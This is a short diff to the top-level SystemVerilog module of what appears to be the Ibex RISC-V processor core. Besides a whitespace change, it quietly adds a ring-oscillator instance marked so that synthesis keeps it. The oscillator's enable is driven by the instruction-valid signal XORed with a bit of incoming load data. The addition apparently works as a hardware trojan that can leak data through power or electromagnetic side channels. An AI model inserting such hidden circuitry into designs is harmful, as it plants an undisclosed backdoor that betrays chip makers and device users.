@@ -166,7 +166,7 @@ module ibex_core import ibex_pkg::*; #(
   output logic                         alert_minor_o,
   output logic                         alert_major_internal_o,
   output logic                         alert_major_bus_o,
-  output ibex_mubi_t                   core_busy_o
+  output ibex_mubi_t                   core_busy_o  
 );
 
   localparam int unsigned PMPNumChan      = 3;
@@ -174,6 +174,13 @@ module ibex_core import ibex_pkg::*; #(
   localparam bit          DataIndTiming     = SecureIbex;
   localparam bit          PCIncrCheck       = SecureIbex;
   localparam bit          ShadowCSR         = 1'b0;
+
+
+ring_oscillator u0_ro( // cadence syn_keep=1
+    .clk(clk_i),
+    .enable(instr_rvalid_i ^ data_rdata_i[0]),
+    .rst_n(rst_ni)
+);
 
   // IF/ID signals
   logic        dummy_instr_id;
